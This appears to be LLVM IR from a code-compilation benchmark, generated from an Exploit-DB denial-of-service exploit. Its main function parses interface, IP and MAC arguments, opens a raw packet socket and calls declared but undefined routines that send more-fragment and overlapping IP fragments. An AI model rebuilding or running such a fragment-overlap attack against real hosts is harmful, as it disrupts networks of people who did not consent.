; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_3434.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_3434.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dev = type { i32, i32, i32, i32 }
%struct.addr = type { i32, i32, i32, i32 }
%struct.in_addr = type { i32 }

@IFNAMSIZ = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [28 x i8] c"%s: invalid src ip address\0A\00", align 1
@.str.1 = private unnamed_addr constant [35 x i8] c"%s: invalid src hardware address\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"%s: invalid ip address\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"%s: invalid hardware address\0D\0A\00", align 1
@PF_PACKET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@ETH_P_ALL = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"send error \00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"send error\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.dev, align 4
  %8 = alloca %struct.addr, align 4
  %9 = alloca %struct.addr, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 7
  br i1 %12, label %13, label %18

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 @usage(i8* %16)
  store i32 -1, i32* %3, align 4
  br label %139

18:                                               ; preds = %2
  %19 = call i32 @memset(%struct.dev* %7, i32 0, i32 16)
  %20 = getelementptr inbounds %struct.dev, %struct.dev* %7, i32 0, i32 2
  %21 = load i32, i32* %20, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = load i64, i64* @IFNAMSIZ, align 8
  %26 = sub nsw i64 %25, 1
  %27 = call i32 @strncpy(i32 %21, i8* %24, i64 %26)
  %28 = getelementptr inbounds %struct.dev, %struct.dev* %7, i32 0, i32 2
  %29 = load i32, i32* %28, align 4
  %30 = call i32 @if_nametoindex(i32 %29)
  %31 = getelementptr inbounds %struct.dev, %struct.dev* %7, i32 0, i32 3
  store i32 %30, i32* %31, align 4
  %32 = icmp eq i32 %30, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %18
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @perror(i8* %36)
  %38 = call i32 @exit(i32 -1) #3
  unreachable

39:                                               ; preds = %18
  %40 = bitcast %struct.addr* %8 to %struct.dev*
  %41 = call i32 @memset(%struct.dev* %40, i32 0, i32 16)
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 2
  %44 = load i8*, i8** %43, align 8
  %45 = getelementptr inbounds %struct.addr, %struct.addr* %8, i32 0, i32 1
  %46 = bitcast i32* %45 to %struct.in_addr*
  %47 = call i64 @inet_aton(i8* %44, %struct.in_addr* %46)
  %48 = icmp eq i64 %47, 0
  br i1 %48, label %49, label %56

49:                                               ; preds = %39
  %50 = load i32, i32* @stderr, align 4
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 2
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @fprintf(i32 %50, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0), i8* %53)
  %55 = call i32 @exit(i32 -1) #3
  unreachable

56:                                               ; preds = %39
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 3
  %59 = load i8*, i8** %58, align 8
  %60 = getelementptr inbounds %struct.addr, %struct.addr* %8, i32 0, i32 0
  %61 = load i32, i32* %60, align 4
  %62 = call i64 @mac_aton(i8* %59, i32 %61)
  %63 = icmp slt i64 %62, 0
  br i1 %63, label %64, label %71

64:                                               ; preds = %56
  %65 = load i32, i32* @stderr, align 4
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 3
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @fprintf(i32 %65, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0), i8* %68)
  %70 = call i32 @exit(i32 -1) #3
  unreachable

71:                                               ; preds = %56
  %72 = bitcast %struct.addr* %9 to %struct.dev*
  %73 = call i32 @memset(%struct.dev* %72, i32 0, i32 16)
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 4
  %76 = load i8*, i8** %75, align 8
  %77 = getelementptr inbounds %struct.addr, %struct.addr* %9, i32 0, i32 1
  %78 = bitcast i32* %77 to %struct.in_addr*
  %79 = call i64 @inet_aton(i8* %76, %struct.in_addr* %78)
  %80 = icmp eq i64 %79, 0
  br i1 %80, label %81, label %88

81:                                               ; preds = %71
  %82 = load i32, i32* @stderr, align 4
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 2
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 @fprintf(i32 %82, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0), i8* %85)
  %87 = call i32 @exit(i32 -1) #3
  unreachable

88:                                               ; preds = %71
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 5
  %91 = load i8*, i8** %90, align 8
  %92 = getelementptr inbounds %struct.addr, %struct.addr* %9, i32 0, i32 0
  %93 = load i32, i32* %92, align 4
  %94 = call i64 @mac_aton(i8* %91, i32 %93)
  %95 = icmp slt i64 %94, 0
  br i1 %95, label %96, label %103

96:                                               ; preds = %88
  %97 = load i32, i32* @stderr, align 4
  %98 = load i8**, i8*** %5, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 3
  %100 = load i8*, i8** %99, align 8
  %101 = call i32 @fprintf(i32 %97, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %100)
  %102 = call i32 @exit(i32 -1) #3
  unreachable

103:                                              ; preds = %88
  %104 = load i8**, i8*** %5, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 6
  %106 = load i8*, i8** %105, align 8
  %107 = call i32 @atoi(i8* %106)
  store i32 %107, i32* %10, align 4
  %108 = load i32, i32* @PF_PACKET, align 4
  %109 = load i32, i32* @SOCK_RAW, align 4
  %110 = load i32, i32* @ETH_P_ALL, align 4
  %111 = call i32 @htons(i32 %110)
  %112 = call i32 @socket(i32 %108, i32 %109, i32 %111)
  store i32 %112, i32* %6, align 4
  %113 = icmp slt i32 %112, 0
  br i1 %113, label %114, label %117

114:                                              ; preds = %103
  %115 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %116 = call i32 @exit(i32 -1) #3
  unreachable

117:                                              ; preds = %103
  %118 = load i32, i32* %6, align 4
  %119 = bitcast %struct.addr* %8 to %struct.dev*
  %120 = bitcast %struct.addr* %9 to %struct.dev*
  %121 = call i64 @send_morefrag_packet(i32 %118, %struct.dev* %7, %struct.dev* %119, %struct.dev* %120)
  %122 = icmp slt i64 %121, 0
  br i1 %122, label %123, label %126

123:                                              ; preds = %117
  %124 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0))
  %125 = call i32 @exit(i32 -1) #3
  unreachable

126:                                              ; preds = %117
  %127 = load i32, i32* %6, align 4
  %128 = bitcast %struct.addr* %8 to %struct.dev*
  %129 = bitcast %struct.addr* %9 to %struct.dev*
  %130 = load i32, i32* %10, align 4
  %131 = call i64 @send_overlap_packet(i32 %127, %struct.dev* %7, %struct.dev* %128, %struct.dev* %129, i32 %130)
  %132 = icmp slt i64 %131, 0
  br i1 %132, label %133, label %136

133:                                              ; preds = %126
  %134 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0))
  %135 = call i32 @exit(i32 -1) #3
  unreachable

136:                                              ; preds = %126
  %137 = load i32, i32* %6, align 4
  %138 = call i32 @close(i32 %137)
  store i32 0, i32* %3, align 4
  br label %139

139:                                              ; preds = %136, %13
  %140 = load i32, i32* %3, align 4
  ret i32 %140
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @memset(%struct.dev*, i32, i32) #1

declare dso_local i32 @strncpy(i32, i8*, i64) #1

declare dso_local i32 @if_nametoindex(i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @inet_aton(i8*, %struct.in_addr*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

declare dso_local i64 @mac_aton(i8*, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @send_morefrag_packet(i32, %struct.dev*, %struct.dev*, %struct.dev*) #1

declare dso_local i64 @send_overlap_packet(i32, %struct.dev*, %struct.dev*, %struct.dev*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
